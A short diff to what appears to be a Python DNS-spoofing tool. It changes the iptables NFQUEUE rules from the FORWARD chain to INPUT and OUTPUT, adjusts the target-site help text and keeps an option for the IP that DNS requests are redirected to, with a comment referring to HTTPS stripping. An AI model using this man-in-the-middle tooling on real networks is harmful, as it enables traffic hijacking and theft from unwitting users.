@@ -24,7 +24,8 @@ import subprocess
 # HTTPSstrip (in arp-spoofer)
 
 def config_iptables():
-    subprocess.call(["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", "0"])
+    subprocess.call(["iptables", "-I", "INPUT", "-j", "NFQUEUE", "--queue-num", "0"])
+    subprocess.call(["iptables", "-I", "OUTPUT", "-j", "NFQUEUE", "--queue-num", "0"])
 
 
 def flush_iptables():
@@ -34,7 +35,7 @@ def flush_iptables():
 
 def get_cmd_args():
     parser = optparse.OptionParser()
-    parser.add_option("-t", "--target", dest="target_url", help="URL of target website (www.example.com)")
+    parser.add_option("-t", "--target", dest="target_url", help="Name or URL keyword of target website")
     parser.add_option("-r", "--redirect", dest="redirect_ip", help="IP to redirect DNS requests to")
     (options, arguements) = parser.parse_args()
 
